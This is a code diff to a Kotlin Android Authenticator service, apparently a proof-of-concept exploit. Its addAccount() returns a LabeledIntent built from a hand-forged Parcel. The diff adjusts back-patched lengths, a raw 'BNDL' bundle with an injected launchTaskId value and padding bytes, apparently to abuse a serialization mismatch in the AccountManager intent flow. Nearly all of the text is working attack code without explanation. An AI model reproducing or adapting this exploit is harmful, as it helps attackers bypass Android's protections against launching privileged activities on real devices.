@@ -23,8 +23,10 @@ class Authenticator : Service() {
 
       fun labelIntent(): LabeledIntent {
         val intent = Parcel.obtain().apply {
-          intentFor<MainActivity>().writeToParcel(this, 0)
+          intentFor<LoginActivity>().setAction("hello").writeToParcel(this, 0)
         }
+
+        val taskId = 218
 
         val tail = Parcel.obtain().apply {
           writeString(null) // mSourcePackage => resolvedType
@@ -44,15 +46,15 @@ class Authenticator : Service() {
             writeInt(0) // p.90 => profilerInfo(null)
             run {
               writeInt(1) // options != null
-              writeInt(fixme(100)) // back patch length
-              writeInt(0x4C444E42) // 'B' 'N' 'D' 'L'
+              writeInt(fixme(100 + 72)) // back patch length
+              writeInt(Const.BundleMagic) // 'B' 'N' 'D' 'L'
               writeInt(2) // entry count
               writeString("android.activity.launchTaskId") // key 1
-              writeValue(1) // value 1
+              writeValue(taskId) // value 1
               writeString("_") // key 2
               run {  // value 2
                 writeInt(13) // VAL_BYTEARRAY
-                writeInt(fixme(70)) // byte array length
+                writeInt(fixme(70 + 72)) // byte array length
                 writeInt('@'.code)
                 writeInt(0) // nil
               }
@@ -71,6 +73,7 @@ class Authenticator : Service() {
           appendFrom(tail, 0, tail.dataSize())
         }
 
+        labeled.setDataPosition(0)
         return LabeledIntent.CREATOR.createFromParcel(labeled)
       }
 
@@ -86,9 +89,10 @@ class Authenticator : Service() {
           TAG,
           "addAccount() called with: response = $response, accountType = $accountType, authTokenType = $authTokenType, requiredFeatures = $requiredFeatures, options = $options"
         )
-        return bundleOf(
-          AccountManager.KEY_INTENT to LabeledIntent(intentFor<LoginActivity>(), null, 0, 0)
-        )
+
+        val labeledIntent = labelIntent()
+
+        return bundleOf(AccountManager.KEY_INTENT to labeledIntent)
       }
 
 
